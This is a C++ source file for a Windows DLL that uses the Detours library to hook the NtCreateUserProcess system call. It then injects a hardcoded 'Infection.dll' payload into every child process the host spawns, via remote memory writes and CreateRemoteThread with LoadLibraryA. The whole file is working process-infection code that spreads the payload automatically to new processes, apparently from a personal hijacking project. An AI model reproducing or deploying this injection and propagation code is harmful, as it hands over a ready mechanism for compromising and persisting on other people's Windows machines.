// dllmain.cpp : Defines the entry point for the DLL application.
// http://www.rohitab.com/discuss/topic/40191-ntcreateuserprocess/
// https://gist.github.com/apsun/1adb6557a44ea8372e7cc27c3ad827ad
#include "pch.h"
#include<windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <winternl.h>
#include "detours.h"
#include "import.h"
#include <system_error>
#include <shlwapi.h>


#pragma comment(lib,"detours.lib")
#pragma comment(lib,"Shlwapi.lib")

#define CREATE_SUSPENDED 0x0004
#define CREATE_PROCESS_PROTECTED       0x0040

#define CREATE_THREAD_SUSPENDED 0x0001
#define STATUS_INVALID_HANDLE 0xC0000008

typedef void PROCESS_CREATE_INFO, * PPROCESS_CREATE_INFO;
typedef void PROCESS_ATTRIBUTE_LIST, * PPROCESS_ATTRIBUTE_LIST;

const char* payload = "C:\\Users\\ThunderCracker\\Desktop\\Hijack\\Process-Infection\\x64\\Debug\\Infection.dll";

typedef NTSTATUS(WINAPI* realRtlUnicodeStringToAnsiString)(IN PANSI_STRING destinationString, IN PCUNICODE_STRING sourceString, IN BOOLEAN allocateDestinationString);

typedef NTSTATUS(NTAPI* realNtCreateUserProcess)
(
    PHANDLE ProcessHandle,
    PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags,
    ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo,
    PPS_ATTRIBUTE_LIST AttributeList
    );

realNtCreateUserProcess originalNtCreateUserProcess = (realNtCreateUserProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"),
    "NtCreateUserProcess");

realRtlUnicodeStringToAnsiString originalRtlUnicodeStringToAnsiString = (realRtlUnicodeStringToAnsiString)GetProcAddress(GetModuleHandleA("ntdll.dll"),
    "RtlUnicodeStringToAnsiString");


DWORD WINAPI createMessageBox(LPCWSTR lpParam) {
    MessageBox(NULL, lpParam, L"Dll says:", MB_OK);
    return 0;
}

DWORD getProcessIDByName(PRTL_USER_PROCESS_PARAMETERS processParameters) {


    ANSI_STRING as;
    UNICODE_STRING EntryName;
    EntryName.MaximumLength = EntryName.Length = (USHORT)processParameters->ImagePathName.Length;
    EntryName.Buffer = &processParameters->ImagePathName.Buffer[0];
    originalRtlUnicodeStringToAnsiString(&as, &EntryName, TRUE);

    DWORD pid = 0;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(PROCESSENTRY32);

    char buffer[100];

    if (Process32First(snapshot, &process)) {

        do {
            PathStripPathW(EntryName.Buffer);
            
            if (wcscmp(process.szExeFile, &EntryName.Buffer[0]) == 0)
            {
                sprintf_s(buffer, "PID: %ws File: %ws\n ", process.szExeFile, EntryName.Buffer);
                OutputDebugStringA(buffer);

                DWORD tPid = process.th32ProcessID;
                sprintf_s(buffer, "PID: %d\n ", tPid);
                OutputDebugStringA(buffer);

                if (pid < tPid) {
                    pid = tPid;
                }
                
            }
        } while (Process32Next(snapshot, &process));

    }
    
    return pid;
}

NTSTATUS WINAPI  _NtCreateUserProcess
(
    PHANDLE ProcessHandle,
    PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags,
    ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo,
    PPS_ATTRIBUTE_LIST AttributeList
)
{
    char buffer[100];

    sprintf_s(buffer, "Process Flag: %d\n", ProcessFlags);
    OutputDebugStringA(buffer);
    sprintf_s(buffer, "Process Flag: %d\n", ThreadFlags);
    OutputDebugStringA(buffer);
    sprintf_s(buffer, "desire process flag Flag: %d\n", ProcessDesiredAccess);
    OutputDebugStringA(buffer);

    NTSTATUS status = originalNtCreateUserProcess(ProcessHandle, ThreadHandle, ProcessDesiredAccess, ThreadDesiredAccess, ProcessObjectAttributes, ThreadObjectAttributes, ProcessFlags, ThreadFlags, ProcessParameters, CreateInfo, AttributeList);

    if (status == ERROR_SUCCESS) {

        DWORD pid = getProcessIDByName(ProcessParameters);
        sprintf_s(buffer, "pid: %d\n", pid);
        OutputDebugStringA(buffer);

        if (pid != 0) {
            HANDLE processHandle = OpenProcess(
                PROCESS_CREATE_THREAD | // For CreateRemoteThread
                PROCESS_VM_OPERATION | // For VirtualAllocEx/VirtualFreeEx
                PROCESS_VM_WRITE,       // For WriteProcessMemory
                FALSE,                  // Don't inherit handles
                pid);            // PID of our target process It was originally published on https://www.apriorit.com/

            LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
            LPVOID dereercomp = VirtualAllocEx(processHandle, NULL, strlen(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            WriteProcessMemory(processHandle, dereercomp, payload, strlen(payload), NULL);
            HANDLE asdc = CreateRemoteThread(processHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);;
        }

    }

    return status;
}


void attachDetour() {

    DetourRestoreAfterWith();
    DetourTransactionBegin();

    DetourUpdateThread(GetCurrentThread());

    DetourAttach((PVOID*)&originalNtCreateUserProcess, _NtCreateUserProcess);

    DetourTransactionCommit();
}

void deAttachDetour() {

    DetourTransactionBegin();

    DetourUpdateThread(GetCurrentThread());

    DetourDetach((PVOID*)&originalNtCreateUserProcess, _NtCreateUserProcess);

    DetourTransactionCommit();
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        attachDetour();
        break;
    case DLL_PROCESS_DETACH:
        deAttachDetour();
        break;
    }
    return TRUE;
}
